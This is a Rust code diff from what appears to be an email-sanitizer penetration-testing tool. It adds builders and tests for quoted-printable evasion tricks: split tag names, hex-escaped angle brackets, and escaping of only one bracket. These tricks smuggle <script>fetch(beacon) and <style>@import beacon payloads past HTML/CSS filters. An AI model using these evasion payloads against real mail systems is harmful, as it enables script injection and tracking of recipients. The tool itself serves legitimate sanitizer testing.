@@ -1493,7 +1493,11 @@ mod technique_message_tests {
             "mime-alternative-control-css",
             "encoded-word-header",
             "qp-soft-break",
+            "qp-soft-break-style",
             "qp-hex-escaped-tags",
+            "qp-hex-escaped-style-tags",
+            "qp-hex-open-angle-only",
+            "qp-hex-close-angle-only",
             "qp-natural-wrap-1",
             "qp-natural-wrap-10",
         ] {
@@ -1604,6 +1608,32 @@ mod technique_message_tests {
     }
 
     #[test]
+    fn qp_soft_break_style_message_never_shows_style_unbroken() {
+        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-soft-break-style").unwrap();
+        let text = as_text(&bytes);
+        assert!(text.contains("Content-Transfer-Encoding: quoted-printable"));
+        assert!(!text.contains("<style"));
+        assert!(!text.contains("</style"));
+        assert!(text.contains("<sty=\r\nle>"));
+        assert!(text.contains("</sty=\r\nle>"));
+        assert!(text.contains("@import"));
+        assert!(text.contains(BEACON));
+    }
+
+    #[test]
+    fn qp_hex_escaped_style_tags_message_has_no_literal_angle_brackets_around_style() {
+        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-hex-escaped-style-tags").unwrap();
+        let text = as_text(&bytes);
+        assert!(text.contains("Content-Transfer-Encoding: quoted-printable"));
+        assert!(!text.contains("<style"));
+        assert!(!text.contains("</style"));
+        assert!(text.contains("=3Cstyle=3E"));
+        assert!(text.contains("=3C/style=3E"));
+        assert!(text.contains("@import"));
+        assert!(text.contains(BEACON));
+    }
+
+    #[test]
     fn qp_hex_escaped_tags_message_has_no_literal_angle_brackets_around_script() {
         let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-hex-escaped-tags").unwrap();
         let text = as_text(&bytes);
@@ -1612,6 +1642,34 @@ mod technique_message_tests {
         assert!(!text.contains("</script"));
         assert!(text.contains("=3Cscript=3E"));
         assert!(text.contains("=3C/script=3E"));
+        assert!(text.contains(BEACON));
+    }
+
+    #[test]
+    fn qp_hex_open_angle_only_message_leaves_the_closing_bracket_literal() {
+        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-hex-open-angle-only").unwrap();
+        let text = as_text(&bytes);
+        // The opening '<' is hex-escaped (no literal "<script" substring
+        // anywhere), but "script>" and "/script>" stay literal - isolates
+        // whether a scanner needing to see BOTH brackets behaves
+        // differently from one that only cares about "<script" alone.
+        assert!(!text.contains("<script"));
+        assert!(text.contains("=3Cscript>"));
+        assert!(text.contains("=3C/script>"));
+        assert!(text.contains(BEACON));
+    }
+
+    #[test]
+    fn qp_hex_close_angle_only_message_leaves_the_opening_bracket_literal() {
+        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-hex-close-angle-only").unwrap();
+        let text = as_text(&bytes);
+        // Mirror image: the literal "<script" substring IS present (only
+        // '>' is hex-escaped), but no complete, literal "<script>" tag
+        // shape ever appears in the raw bytes.
+        assert!(text.contains("<script"));
+        assert!(!text.contains("<script>"));
+        assert!(!text.contains("</script>"));
+        assert!(text.contains("script=3E"));
         assert!(text.contains(BEACON));
     }
 }
@@ -5290,6 +5348,46 @@ fn build_qp_soft_break_message(from: &str, to: &str, subject: &str, beacon_url: 
     message.into_bytes()
 }
 
+// Every QP evasion technique above (this one included) only ever targeted
+// <script> - a pentester's own follow-up naming "prasowania HTML/CSS"
+// (folding of HTML/CSS) specifically called out CSS too, and this app's
+// one CONFIRMED real finding this session was a CSS @import sanitizer
+// gap (css-import in PAYLOADS above) - never combined with any of the
+// SMTP/MIME-encoding evasion mechanics tested against <script>. Same
+// split-the-tag-name soft break as build_qp_soft_break_message, applied
+// to <style>/</style> instead of <script>/</script>.
+fn build_qp_soft_break_style_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
+    let pangram_encoded = quoted_printable_encode("Zażółć gęślą jaźń");
+    let body = format!(
+        "<p>{pangram_encoded}</p><p>Test:</p><sty=\r\nle>@import \"{beacon_url}\";</sty=\r\nle>",
+        pangram_encoded = pangram_encoded,
+        beacon_url = beacon_url
+    );
+    let message = format!(
+        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
+        headers = technique_message_headers(from, to, subject, beacon_url),
+        body = body
+    );
+    message.into_bytes()
+}
+
+// CSS companion to build_qp_hex_escaped_tags_message - hex-escapes both
+// '<' and '>' around <style>/</style> instead of <script>/</script>, same
+// reasoning (no literal "<style"/"</style" substring anywhere in the raw
+// wire bytes).
+fn build_qp_hex_escaped_style_tags_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
+    let body = format!(
+        "<p>Test:</p>=3Cstyle=3E@import \"{beacon_url}\";=3C/style=3E",
+        beacon_url = beacon_url
+    );
+    let message = format!(
+        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
+        headers = technique_message_headers(from, to, subject, beacon_url),
+        body = body
+    );
+    message.into_bytes()
+}
+
 // RFC 2045 §6.7 rule 5: an encoded line must not exceed 76 characters
 // (not counting the trailing CRLF) - a real, standards-compliant QP
 // encoder inserts its OWN soft line break (a trailing '=' + CRLF, removed
@@ -5384,6 +5482,41 @@ fn build_qp_hex_escaped_tags_message(from: &str, to: &str, subject: &str, beacon
     message.into_bytes()
 }
 
+// Companion pair to the message above - that one hex-escapes BOTH '<' and
+// '>' together, which can't tell apart a scanner that only cares about the
+// literal "<script" substring (never requiring a closing '>') from one
+// that needs a complete "<...>" shape to recognize something as a tag
+// worth stripping. These two isolate each angle bracket on its own: only
+// '<' escaped (literal "script>" left readable) vs only '>' escaped
+// (literal "<script" left readable) - if either alone behaves differently
+// from both-escaped, that pins down which bracket actually matters to
+// whatever's doing the scanning.
+fn build_qp_hex_open_angle_only_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
+    let body = format!(
+        "<p>Test:</p>=3Cscript>fetch('{beacon_url}').catch(function(){{}})=3C/script>",
+        beacon_url = beacon_url
+    );
+    let message = format!(
+        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
+        headers = technique_message_headers(from, to, subject, beacon_url),
+        body = body
+    );
+    message.into_bytes()
+}
+
+fn build_qp_hex_close_angle_only_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
+    let body = format!(
+        "<p>Test:</p><script=3Efetch('{beacon_url}').catch(function(){{}})</script=3E",
+        beacon_url = beacon_url
+    );
+    let message = format!(
+        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
+        headers = technique_message_headers(from, to, subject, beacon_url),
+        body = body
+    );
+    message.into_bytes()
+}
+
 fn build_technique_message(from: &str, to: &str, subject: &str, beacon_url: &str, technique: &str) -> Result<Vec<u8>, String> {
     match technique {
         "utf7-charset" => Ok(build_utf7_charset_message(from, to, subject, beacon_url)),
@@ -5394,7 +5527,11 @@ fn build_technique_message(from: &str, to: &str, subject: &str, beacon_url: &str
         "encoded-word-header" => Ok(build_encoded_word_header_message(from, to, subject, beacon_url)),
         "overlong-utf8" => Ok(build_overlong_utf8_message(from, to, subject, beacon_url)),
         "qp-soft-break" => Ok(build_qp_soft_break_message(from, to, subject, beacon_url)),
+        "qp-soft-break-style" => Ok(build_qp_soft_break_style_message(from, to, subject, beacon_url)),
+        "qp-hex-escaped-style-tags" => Ok(build_qp_hex_escaped_style_tags_message(from, to, subject, beacon_url)),
         "qp-hex-escaped-tags" => Ok(build_qp_hex_escaped_tags_message(from, to, subject, beacon_url)),
+        "qp-hex-open-angle-only" => Ok(build_qp_hex_open_angle_only_message(from, to, subject, beacon_url)),
+        "qp-hex-close-angle-only" => Ok(build_qp_hex_close_angle_only_message(from, to, subject, beacon_url)),
         other if other.starts_with("qp-natural-wrap-") => {
             let variant: u32 = other["qp-natural-wrap-".len()..]
                 .parse()
